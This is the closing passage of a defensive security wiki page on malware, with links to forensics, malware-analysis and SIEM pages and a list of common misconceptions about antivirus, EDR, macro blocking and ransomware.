- [Digital forensics](../blue-teaming/digital-forensics.md) — how to extract host, memory, and network evidence from an infected system.
- [Threat intel and malware analysis tools](../general-security/open-source-tools/threat-intel-and-malware.md) — open-source tooling for sandboxing, classifying, and pivoting.
- [SIEM and monitoring](../general-security/open-source-tools/siem-and-monitoring.md) — where the family-specific detection rules run.

## Common misconceptions

- **"Antivirus protects against malware."** Modern signature AV catches known commodity malware; targeted, polymorphic, fileless, and packed samples regularly bypass it. AV is a baseline, not a strategy.
- **"If we have EDR, we are covered."** EDR is much better than AV but still depends on rules, telemetry, and humans triaging alerts. A misconfigured EDR is no EDR at all.
- **"Macro protection solved phishing."** Macros are blocked by default; attackers moved to LNK, ISO, IMG, OneNote, HTML smuggling, and OAuth consent. The phishing problem migrated, it did not vanish.
- **"Ransomware is the worst-case."** Wipers (NotPetya, HermeticWiper) and supply-chain compromises that go undetected for months are arguably worse — silent data theft is harder to recover from than visible encryption.
